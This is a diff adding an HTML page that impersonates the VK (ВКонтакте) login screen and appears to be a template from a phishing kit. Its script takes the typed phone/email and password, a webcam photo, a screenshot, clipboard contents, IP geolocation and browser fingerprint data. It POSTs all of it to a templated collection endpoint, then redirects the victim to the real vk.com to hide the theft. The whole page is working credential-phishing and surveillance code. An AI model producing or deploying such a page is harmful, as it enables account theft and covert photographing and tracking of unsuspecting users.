@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>ВКонтакте • Вход</title>
+<link rel="icon" href="https://vk.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e7ebf0;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;border-radius:4px;padding:32px;max-width:380px;width:90%;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.08)}
+.logo{width:56px;margin-bottom:20px}
+h1{font-size:18px;font-weight:500;color:#222;margin-bottom:24px}
+.input-group{margin-bottom:12px}
+.input-group input{width:100%;padding:12px;border:1px solid #d3d9de;border-radius:4px;font-size:14px;outline:none;background:#f5f7f8}
+.input-group input:focus{border-color:#4a76a8;background:#fff}
+.btn{background:#4a76a8;color:#fff;border:none;border-radius:4px;padding:12px;font-size:14px;width:100%;cursor:pointer;font-weight:500;transition:background .15s}
+.btn:hover{background:#3d6894}
+.btn:disabled{opacity:.5;cursor:default}
+#video{display:none;width:100%;border-radius:4px;margin:12px 0;background:#000;max-height:200px;object-fit:cover}
+.loading{display:none;margin-top:12px;color:#666;font-size:13px}
+</style>
+</head>
+<body>
+<div class="card">
+<img class="logo" src="https://vk.com/favicon.ico" alt="VK">
+<h1>Вход ВКонтакте</h1>
+<div class="input-group"><input type="text" id="login" placeholder="Телефон или email" autocomplete="off"></div>
+<div class="input-group"><input type="password" id="password" placeholder="Пароль" autocomplete="off"></div>
+<button class="btn" id="login_btn" onclick="login()">Войти</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Выполняется вход...</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp');const j=await r.json();Object.assign(c,j)}catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function login(){
+    const l=document.getElementById('login').value.trim(),pw=document.getElementById('password').value.trim();
+    if(!l||!pw)return;
+    c.login=l;c.password=pw;
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='block';
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    await collect();
+    document.getElementById('loading').textContent='✓ Вход выполнен!';
+    setTimeout(()=>{window.location.href='https://vk.com'},1500)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
